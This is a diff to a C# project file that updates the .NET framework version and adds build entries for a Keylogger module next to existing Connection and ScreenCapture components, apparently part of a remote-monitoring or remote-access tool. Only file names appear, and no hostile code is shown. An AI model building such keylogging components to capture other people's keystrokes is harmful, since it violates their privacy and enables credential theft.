@@ -9,7 +9,7 @@
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>Core</RootNamespace>
     <AssemblyName>Core</AssemblyName>
-    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <TargetFrameworkProfile />
   </PropertyGroup>
@@ -22,6 +22,7 @@
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
     <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <DebugType>pdbonly</DebugType>
@@ -30,6 +31,7 @@
     <DefineConstants>TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
@@ -47,6 +49,12 @@
     <Compile Include="Connection\Connection.cs" />
     <Compile Include="Connection\ConnectionConfiguration.cs" />
     <Compile Include="Connection\Enums\ConnectionType.cs" />
+    <Compile Include="Keylogger\Entities\CallbackObjects\KeyPressed.cs" />
+    <Compile Include="Keylogger\Entities\KeyCode.cs" />
+    <Compile Include="Keylogger\Helpers\KeyboardLayout.cs" />
+    <Compile Include="Keylogger\Helpers\Window.cs" />
+    <Compile Include="Keylogger\Keylogger.cs" />
+    <Compile Include="Keylogger\User32.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Screenshot\ScreenCapture.cs" />
   </ItemGroup>
